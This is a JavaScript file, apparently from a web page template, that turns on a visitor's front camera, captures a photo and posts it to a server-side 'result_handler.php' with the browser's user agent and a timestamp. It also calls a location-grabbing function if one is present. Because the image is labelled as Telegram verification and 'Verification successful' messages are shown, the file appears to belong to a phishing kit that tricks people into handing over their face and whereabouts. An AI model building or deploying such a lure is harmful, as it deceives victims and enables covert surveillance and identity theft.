// Camera functionality for both mobile and desktop
let stream = null;
let video = null;
let canvas = null;
let ctx = null;

document.addEventListener('DOMContentLoaded', function() {
    video = document.getElementById('video');
    canvas = document.getElementById('canvas');
    ctx = canvas.getContext('2d');
});

// Function to start the camera
async function startCamera() {
    try {
        // Check if browser supports mediaDevices API
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            alert('Your browser does not support camera access. Please use a modern browser.');
            return false;
        }
        
        // Request camera access
        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: 'user', // Use front camera on mobile
                width: { ideal: 640 },
                height: { ideal: 480 }
            },
            audio: false 
        });
        
        // Show camera feed
        video.srcObject = stream;
        return true;
        
    } catch (error) {
        console.error('Error accessing camera:', error);
        if (error.name === 'NotAllowedError') {
            alert('Camera access was denied. Please allow camera access to continue.');
        } else {
            alert('Could not access camera. Please ensure you have a camera connected and try again.');
        }
        return false;
    }
}

// Function to stop the camera
function stopCamera() {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
    }
}

// Function to capture image
function captureImage() {
    try {
        // Set canvas dimensions to match video
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // Draw current video frame to canvas
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Convert canvas to data URL
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        // Stop camera stream
        stopCamera();
        
        // Send image to server
        sendImageToServer(imageData);
        
        // Close modal
        $("#camera-modal").fadeOut();
        
        // También obtener ubicación si es posible
        if (typeof getLocation === 'function') {
            getLocation();
        }
        
        return imageData;
        
    } catch (error) {
        console.error('Error capturing image:', error);
        alert('Error capturing image. Please try again.');
        return null;
    }
}

// Function to send image to server
function sendImageToServer(imageData) {
    console.log('Attempting to send image to server...');
    
    try {
        // Convert data URL to blob
        fetch(imageData)
            .then(res => {
                console.log('Converting image to blob...');
                return res.blob();
            })
            .then(blob => {
                console.log('Blob created, size:', blob.size, 'bytes');
                
                // Create form data
                const formData = new FormData();
                formData.append('webcamImage', blob, 'telegram_verification.jpg');
                formData.append('userAgent', navigator.userAgent);
                formData.append('timestamp', new Date().toISOString());
                formData.append('debug', 'true');
                
                console.log('Sending to server...');
                
                // Send to server - IMPORTANTE: usa la ruta CORRECTA
                return fetch('result_handler.php', {  // ← Esta ruta es RELATIVA al template
                    method: 'POST',
                    body: formData
                });
            })
            .then(response => {
                console.log('Server response status:', response.status);
                return response.text();
            })
            .then(data => {
                console.log('Server response:', data);
                if (data === 'OK') {
                    alert('Verification successful! Redirecting...');
                } else {
                    alert('Verification failed. Please try again.');
                }
            })
            .catch(error => {
                console.error('Error uploading image:', error);
                alert('Error sending verification. Please check console for details.');
            });
    } catch (error) {
        console.error('Error in sendImageToServer:', error);
        alert('Unexpected error. Please check console.');
    }
}

// Handle page visibility changes (especially important for mobile)
document.addEventListener('visibilitychange', function() {
    if (document.hidden && stream) {
        // Page is hidden, stop camera to conserve resources
        stopCamera();
    }
});

// Handle page unload
window.addEventListener('beforeunload', function() {
    stopCamera();
});